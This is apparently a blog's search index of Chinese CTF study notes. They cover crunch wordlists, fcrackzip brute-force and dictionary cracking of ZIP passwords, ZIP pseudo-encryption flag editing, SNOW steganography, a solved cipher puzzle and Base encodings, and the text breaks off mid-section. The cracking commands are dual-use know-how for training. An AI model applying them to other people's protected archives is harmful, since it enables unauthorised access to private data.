<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>爆破密钥</title>
    <link href="/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A5/"/>
    <url>/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="crunch介绍与使用"><a href="#crunch介绍与使用" class="headerlink" title="crunch介绍与使用"></a>crunch介绍与使用</h1><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>crunch是什么？</p><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。</p><h3 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h3><p>Kali中已自带crunch工具，可直接在kali中使用。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716614477509-552d4d9e-6a58-423b-b5f4-f395fe0e0b4d.png"></p><p>命令格式：</p><p>crunch <min-len> <max-len> [<charset string>] [options]</p><p>参数：</p><p>min-len 最小长度字符串，即使不使用参数的值，也需要此选项</p><p>max-len 最大长度字符串，即使不使用参数的值，也需要此选项</p><p>charset string 字符集设置，默认是小写字符集</p><p>options :</p><p>-b 指定文件输出的大小，避免字典文件过大</p><p>-c 指定文件输出的行数，即包含密码的个数</p><p>-d 限制相同元素出现的次数</p><p>-e 定义停止字符，即到该字符串就停止生成</p><p>-f 调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</p><p>-i 改变输出格式，即aaa,aab -&gt; aaa,baa</p><p>-I 通常与-t联合使用，表明该字符为实义字符</p><p>-m 通常与-p搭配</p><p>-o 将密码保存到指定文件</p><p>-p 指定元素以组合的方式进行</p><p>-q 读取密码文件，即读取pass.txt</p><p>-r 定义重某一字符串重新开始</p><p>-s 指定一个开始的字符，即从自己定义的密码xxxx开始</p><p>-t 指定密码输出的格式</p><p>-u 禁止打印百分比（必须为最后一个选项）</p><p>-z 压缩生成的字典文件，支持gzip,bzip2,lzma,7z</p><p>特殊字符，通常与-t配合使用</p><p>% 代表数字</p><p>^ 代表特殊符号</p><p>@ 代表小写字符</p><p>, 代表大写字符</p><h3 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h3><p>crunch 6 6 123 -o number.txt &#x2F;&#x2F;生成六位以123元素为组合的字典集，并输出到number.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617221789-837ade83-d7c9-48ea-96df-1d4712847746.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617240055-ba818cf4-2cf8-424f-9eff-fe2892f3a0c2.png"></p><p>crunch 1 1 -q read &#x2F;&#x2F;读取read文件中每行内容作为基本字符生成字典</p><p>read文件内容如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617261938-a8369232-d4a5-4511-8a79-861a289f3a44.png"></p><p>生成的字典集结果如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1716617304995-4aa62323-a79f-4dad-a8bb-6623d6934746.png"></p><h1 id="fcrackzip的使用（爆破）"><a href="#fcrackzip的使用（爆破）" class="headerlink" title="fcrackzip的使用（爆破）"></a>fcrackzip的使用（爆破）</h1><h4 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1. 暴力破解"></a>1. 暴力破解</h4><p>暴力破解适用于不知道密码任何信息的情况。指定字符集和密码长度范围即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">fcrackzip -b -c <span class="hljs-tag">&lt;<span class="hljs-name">字符集</span>&gt;</span> -l <span class="hljs-tag">&lt;<span class="hljs-name">最小长度</span>&gt;</span>-<span class="hljs-tag">&lt;<span class="hljs-name">最大长度</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">zip文件</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>-b</code>：使用暴力破解模式。</li><li><code>-c &lt;字符集&gt;</code>：指定字符集，例如 <code>a</code> 代表小写字母，<code>A</code> 代表大写字母，<code>1</code> 代表数字。</li><li><code>-l &lt;最小长度&gt;-&lt;最大长度&gt;</code>：密码长度范围。</li><li><code>-u</code>：测试解压文件的有效性。</li></ul><p><strong>示例：</strong><br>尝试破解长度为 4 到 5 位的数字密码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c <span class="hljs-number">1</span> -l <span class="hljs-number">4</span>-<span class="hljs-number">5</span> -u file.zip<br></code></pre></td></tr></table></figure><h4 id="2-字典攻击"><a href="#2-字典攻击" class="headerlink" title="2. 字典攻击"></a>2. 字典攻击</h4><p>字典攻击适用于有密码列表（字典文件）的情况。可以指定字典文件来尝试其中的每个密码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">fcrackzip -D -p <span class="hljs-tag">&lt;<span class="hljs-name">字典文件</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">zip文件</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>-D</code>：使用字典攻击模式。</li><li><code>-p &lt;字典文件&gt;</code>：指定密码字典文件的路径。</li></ul><p><strong>示例：</strong><br>使用字典文件 <code>passwords.txt</code> 尝试破解：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">fcrackzip -<span class="hljs-keyword">D</span> -p passwords.txt -<span class="hljs-keyword">u</span> <span class="hljs-keyword">file</span>.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure><h4 id="3-常用字符集参数"><a href="#3-常用字符集参数" class="headerlink" title="3. 常用字符集参数"></a>3. 常用字符集参数</h4><ul><li><code>a</code>：小写字母（<code>abcdefghijklmnopqrstuvwxyz</code>）</li><li><code>A</code>：大写字母（<code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code>）</li><li><code>1</code>：数字（<code>0123456789</code>）</li><li><code>!</code>：符号（例如 <code>!@#$%^&amp;*()</code>）</li></ul><p><strong>示例：</strong><br>尝试小写字母和数字组合，密码长度为 3 到 4 位：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c a1 -l <span class="hljs-number">3</span>-<span class="hljs-number">4</span> -u file.zip<br></code></pre></td></tr></table></figure><h3 id="其他有用的选项"><a href="#其他有用的选项" class="headerlink" title="其他有用的选项"></a>其他有用的选项</h3><ul><li><code>-v</code>：启用详细模式，可以显示破解过程中的进度。</li><li><code>-m</code>：指定压缩方法（0 到 3），通常可以忽略。</li></ul><h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><p>假设我们知道密码是 5 位的小写字母，可以使用如下命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fcrackzip</span> -b -c a -l <span class="hljs-number">5</span>-<span class="hljs-number">5</span> -u -v file.zip<br></code></pre></td></tr></table></figure><p>这会尝试所有 5 位的小写字母组合，并在找到匹配密码时停止。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、生日密码"><a href="#1、生日密码" class="headerlink" title="1、生日密码"></a>1、生日密码</h2><p>文件的主人喜欢用生日做密码，而且还是个90后。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715053493021-aed86311-0af2-4eaf-8c25-430469dadb3d.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715053557954-7358c455-a98b-4fc0-8fd6-7fd63cfe0b69.png"></p><p>得出密钥（并不是flag哦），要输入密钥打开加密文件得到flag</p><h2 id="2、银行卡密码-键盘密码"><a href="#2、银行卡密码-键盘密码" class="headerlink" title="2、银行卡密码 键盘密码"></a>2、银行卡密码 键盘密码</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722315081536-c888b8a1-0876-47be-96f5-8d796085285b.png"></p><p>猜测只有数字密码（需要猜吗）得到密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722315252325-71248c79-a013-4a84-a67d-347611dba893.png"></p><p>得到第一行为键盘密码</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">93</span> <span class="hljs-number">53</span> <span class="hljs-number">63</span> <span class="hljs-number">71</span> <span class="hljs-number">51</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">83</span> <span class="hljs-number">63</span> <span class="hljs-number">23</span> <span class="hljs-number">23</span> <span class="hljs-number">93</span> <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">94</span> <span class="hljs-number">93</span> <span class="hljs-number">71</span> <span class="hljs-number">41</span> <span class="hljs-number">92</span> <span class="hljs-number">41</span> <span class="hljs-number">71</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">31</span> <span class="hljs-number">83</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">21</span> <span class="hljs-number">81</span> <span class="hljs-number">22</span> <span class="hljs-number">21</span> <span class="hljs-number">74</span> <span class="hljs-number">42</span><br><br>The encryption scheme of next stage is decided by the last  letters.<br><br>T1:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   **@@@@**<br><br>T2:@@@@@@@@@@@@@@@@@@@@@@@@   **@@@@@@@**<br><br>T3:@@@@@@@@@@@@@@@@@   **@@@@@@@**<br><br>T4:@@@@@@@@   **@@@@@@ @@@**<br><br>NSSCTF&#123;REVERSE(**@@@@@@@@**)&#125;<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">str</span> = &#x27;<span class="hljs-number">93</span> <span class="hljs-number">53</span> <span class="hljs-number">63</span> <span class="hljs-number">71</span> <span class="hljs-number">51</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">83</span> <span class="hljs-number">63</span> <span class="hljs-number">23</span> <span class="hljs-number">23</span> <span class="hljs-number">93</span> <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">94</span> <span class="hljs-number">93</span> <span class="hljs-number">71</span> <span class="hljs-number">41</span> <span class="hljs-number">92</span> <span class="hljs-number">41</span> <span class="hljs-number">71</span> <span class="hljs-number">63</span> <span class="hljs-number">41</span> <span class="hljs-number">51</span> <span class="hljs-number">31</span> <span class="hljs-number">83</span> <span class="hljs-number">43</span> <span class="hljs-number">41</span> <span class="hljs-number">21</span> <span class="hljs-number">81</span> <span class="hljs-number">22</span> <span class="hljs-number">21</span> <span class="hljs-number">74</span> <span class="hljs-number">42</span>&#x27;<br><span class="hljs-attribute">table</span> =<span class="hljs-meta"> [&#x27;abc&#x27;,&#x27;def&#x27;,&#x27;ghi&#x27;,&#x27;jkl&#x27;,&#x27;mno&#x27;,&#x27;pqrs&#x27;,&#x27;tuv&#x27;,&#x27;wxyz&#x27;]</span><br><span class="hljs-attribute">str</span> = str.split(&#x27; &#x27;)<br><span class="hljs-attribute">for</span> i in range(len(str)):<br>    <span class="hljs-attribute">print</span>(table[int(str[i][<span class="hljs-number">0</span>])-<span class="hljs-number">2</span>][int(str[i][<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>],end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p>得到</p><p>ylopjogjvoccynmzypgxgpogjdvigatbash</p><p>然后用atbash解密一下，得到（要去掉atbash）</p><p>bolkqltqelxxbmnabktctkltqwert</p><p>这一个密码就是 qwert<br>这个是解密的 VBS 脚本</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">Function</span> FromQwerty(str)<br>    <span class="hljs-keyword">Dim</span> d, s, t, i, c, r<br>    s = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br>    t = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span><br>    <span class="hljs-keyword">Set</span> d = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.Dictionary&quot;</span>)<br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">52</span><br>        d(<span class="hljs-built_in">Mid</span>(t, i, <span class="hljs-number">1</span>)) = <span class="hljs-built_in">Mid</span>(s, i, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">Next</span><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-built_in">Len</span>(str)<br>        c = <span class="hljs-built_in">Mid</span>(str, i, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">If</span> d.Exists(c) <span class="hljs-keyword">Then</span><br>            r = r &amp; d(c)<br>        <span class="hljs-keyword">Else</span><br>            r = r &amp; c<br>        <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>    <span class="hljs-keyword">Next</span><br>    FromQwerty = r<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Function</span><br><br>WScript.Echo FromQwerty(<span class="hljs-string">&quot;bolkqltqelxxbmnabktctklt&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以先用 txt 粘贴进去，再改名为 1.vbs，点击即可得到</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316540944-3766bb25-5657-4eec-9f28-1e3128615dff.png"></p><p>xisraseacsuuxzykxreverse</p><p>这一个就是 reverse，即把这句话反过来</p><p>print(‘xisraseacsuuxzykx’[::-1])</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316590347-232b97e5-3ce1-499d-bcd9-b4c5483c744c.png"></p><p>得到</p><p>xkyzxuuscaesarsix</p><p>看 T4，它是有空格的，所以这个加密是caesar six，即偏移量为6的凯撒密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316697736-40093dcc-c4b4-44d6-8cfb-db2ed4c082e8.png"></p><p>得到restroom</p><p>最后还有一个reverse</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722316748891-3f830f80-4d5d-491a-84b9-221f62e1f456.png"></p><p>NSSCTF{moortser}</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip解密</title>
    <link href="/2025/03/22/zip%E8%A7%A3%E5%AF%86/"/>
    <url>/2025/03/22/zip%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="ZIP伪加密解析"><a href="#ZIP伪加密解析" class="headerlink" title="ZIP伪加密解析"></a>ZIP伪加密解析</h1><h2 id="1、zip组成"><a href="#1、zip组成" class="headerlink" title="1、zip组成"></a>1、zip组成</h2><p>一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</p><p><a href="https://blog.csdn.net/wclxyn/article/details/7288994">一个zip文件由这样三个部分组成_zip 文件结构_一只独孤的程序猿的博客-CSDN博客</a></p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16.png"></p><p><strong>压缩源文件数据区：</strong><br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密） <strong>头文件标记后2bytes</strong><br><strong>压缩源文件目录区：</strong></p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)</p><p>3F 00：压缩使用的 pkware 版本</p><p>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，伪加密的关键） <strong>目录文件标记后4bytes</strong><br><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06：目录结束标记</p><h2 id="3、全局方式位标记"><a href="#3、全局方式位标记" class="headerlink" title="3、全局方式位标记"></a>3、全局方式位标记</h2><p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br><strong>第二个数字为奇数时 –&gt;加密</strong><br><strong>第二个数字为偶数时 –&gt;未加密</strong></p><h2 id="4、辨别zip是真加密还是伪加密"><a href="#4、辨别zip是真加密还是伪加密" class="headerlink" title="4、辨别zip是真加密还是伪加密"></a>4、辨别zip是真加密还是伪加密</h2><h3 id="1）无加密"><a href="#1）无加密" class="headerlink" title="1）无加密"></a>1）无加密</h3><p>压缩源文件数据区的全局加密应当为00 00 （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c.png"></p><h3 id="2）伪加密"><a href="#2）伪加密" class="headerlink" title="2）伪加密"></a>2）伪加密</h3><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb.png"></p><h3 id="3）真加密"><a href="#3）真加密" class="headerlink" title="3）真加密"></a>3）真加密</h3><p>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00 !</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>把压缩包拖到winhex里打利用WinHex搜索，快速定位到目录区头文件标记处开，50 4B 03 04，这是压缩源文件数据区头文件标记，50 4B 01 02，这是压缩源文件目录区头文件标记，以50为第一处，找到第9、10处数值位置，第9处数值如果是奇数就代表有密码，偶数代表无密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969.png"></p><p>第九位是偶数属于伪加密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2.png"></p><p>把09 00 改成00 00保存后就能打开了</p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>snow雪</title>
    <link href="/2025/03/22/snow%E9%9B%AA/"/>
    <url>/2025/03/22/snow%E9%9B%AA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_53079406/article/details/123810053">【HTML中隐写】Snow免安装、网站版，基本使用方法_snow隐写-CSDN博客</a></p><h1 id="Options（选项）"><a href="#Options（选项）" class="headerlink" title="Options（选项）"></a>Options（选项）</h1><p>-C</p><p>如果隐藏，则压缩数据，或者如果提取，则会解压缩。</p><p>-Q</p><p>静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量。</p><p>-S</p><p>报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项。</p><p>-p password</p><p>如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密。</p><p>-l line-length</p><p>在附加空格时，Snow将始终产生比此值短的线条。默认情况下，它设置为80。</p><p>-f message-file</p><p>此文件的内容将隐藏在输入文本文件中。</p><p>-m message-string</p><p>此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取邮件时，否则不会打印换行符。</p><h1 id="Examples（例子）"><a href="#Examples（例子）" class="headerlink" title="Examples（例子）"></a>Examples（例子）</h1><p>以下命令将隐藏文件infile中的消息“I am lying”中，压缩，并使用密码“Hello World”加密。生成的文本将被存储在外档中。</p><p>snow -C -m “I am lying” -p “hello world” infile outfile</p><p>要提取消息，命令将是</p><p>snow -C -p “hello world” outfile</p><p>请注意，生成的消息不会被换行符终止。</p><p>为防止线包装，如果通过邮件或新闻读卡器缩进隐藏空间的文本，可以使用72或更小的线长度。</p><p>snow -C -l 72 -m “I am lying” infile outfile</p><p>可以使用-s选项确定文件的近似存储容量。</p><p>snow -S -l 72 infile</p><h1 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h1><p>第一步：</p><p>先将文件都放在Snow文件夹中，再进行操作</p><p>原始文件也留一个做对比</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516262056-f5141e85-982d-4f62-ad6a-0e72bedecf65.png"></p><p>第二步：先进入到文件夹中</p><p>然后再执行隐写命令</p><p>snow.exe -C -m “flag” -p “123456” test.html</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516278922-8367041a-2052-474d-9ab6-54bbe0e2dee7.png"></p><p>这里显示压缩了34.38%</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516311489-4035423b-1d95-4d33-9cb7-e0d6459b7246.png"></p><p>最后显示：消息使用大约1.60％的可用空间。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516328589-3f583f4e-d69f-43c6-89ae-64f578c2fb02.png"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="看雪看雪看雪"><a href="#看雪看雪看雪" class="headerlink" title="看雪看雪看雪"></a>看雪看雪看雪</h2><p>看着是16进制，转成字符串<img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730514375667-01f2b8e2-a0b4-4696-8d5f-b4c9e5052dfc.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730514456590-82060d58-8b92-4756-a732-d68b5d9dc771.png"></p><p>直接打开rar，放到7zip里面看一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730515792883-68ebc3c4-f1b5-4019-b964-f23e9690c106.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730515855894-16330991-1ce8-4095-baae-f79dda552885.png"></p><p>key是他朝若是同淋雪</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516023113-79d109fd-195c-40d3-abda-938229a25257.png"></p><p>放到snow里面</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516102071-e2e78419-300b-4e15-b392-55fc18a6755d.png"></p><p>.\SNOW.exe - C -p 他朝若是同淋雪 flag.txt</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730516916400-5ad91e9f-f381-4cbb-bdf5-79b5a5cd2fbc.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编码</title>
    <link href="/2025/03/22/%E7%BC%96%E7%A0%81/"/>
    <url>/2025/03/22/%E7%BC%96%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Base系列编码浅析"><a href="#Base系列编码浅析" class="headerlink" title="Base系列编码浅析"></a>Base系列编码浅析</h1><p><strong>Base编码有很多种，常用****的有：</strong></p><p><strong>base16 base32 base64 base85 base36 base 58 base91 base 92 base62</strong></p><hr><h2 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a><strong>Base16</strong></h2><ul><li>使用16个ASCII可打印字符**（数字0-9和字母A-F）**，对任意字节数据进行编码。</li><li>先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。</li><li>Base16编码后的数据量是原数据的两倍：1000比特数据需要250个字符（即 250*8&#x3D;2000 比特）。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054999723-cd966302-d3f9-4b90-8956-93a0e2886295.png"></p><p><strong>注</strong>：可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“&#x3D;”。</p><p>换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。</p><p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。</p><hr><h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><ul><li>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。</li><li>Base32主要用于编码二进制数据，但是Base32也能够编码诸如ASCII之类的二进制文本。</li><li>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054999740-119b1eb7-f7ac-4fa8-9bfc-f38451263cd2.png"></p><p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。</p><p>例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</p><hr><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><ul><li>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。</li><li>在Base64中的可打印字符包括字母A-Z、a-z、数字0-9，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如uuencode的其他编码方法。</li><li>它可用来作为电子邮件的传输编码。</li><li>Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据，包括MIME的电子邮件及XML的一些复杂数据。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000028-1298ffe1-0538-4f50-8d8e-663a4a155837.png"></p><p>注：BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p><p>如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：</p><p>（1）先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。</p><p>（2）在编码后的Base64文本后加上一个或两个&#x3D;号，代表补足的字节数。</p><p>也就是说：</p><p>当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；</p><p>如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。</p><p>参考下表：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054999888-ec0a017d-0f83-4377-8063-92d014907e6d.png"></p><hr><h2 id="Base85"><a href="#Base85" class="headerlink" title="Base85"></a><strong>Base85</strong></h2><ul><li>base85 也称为Ascii85，是Paul E. Rutter为btoa实用程序开发的一种二进制文本编码形式。通过使用五个ASCII字符来表示四个字节的二进制数据（使编码量1 &#x2F; 4比原来大，假设每ASCII字符8个比特），它比更有效UUENCODE或Base64的，它使用四个字符来表示三个字节的数据（1 &#x2F; 3的增加，假设每ASCII字符8个比特）。</li><li>用途是Adobe的PostScript和Portable Document Format文件格式，以及Git使用的二进制文件的补丁编码。</li><li>与Base64一样，Base85编码的目标是对二进制数据可打印的ASCII字符进行编码。但是它使用了更大的字符集，因此效率更高一些。具体来说，它可以用5个字符编码4个字节（32位）。</li></ul><p>摘自wiki介绍的一个例子：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000044-d63897dd-fccf-4a7c-accb-b29209034074.png"></p><hr><h2 id="Base36"><a href="#Base36" class="headerlink" title="Base36"></a><strong>Base36</strong></h2><p>Base36是一个二进制到文本编码表示方案的二进制数据以ASCII通过将其转化为一个字符串格式基数 -36表示。选择36十分方便，因为可以使用阿拉伯数字 0–9和拉丁字母 A–Z 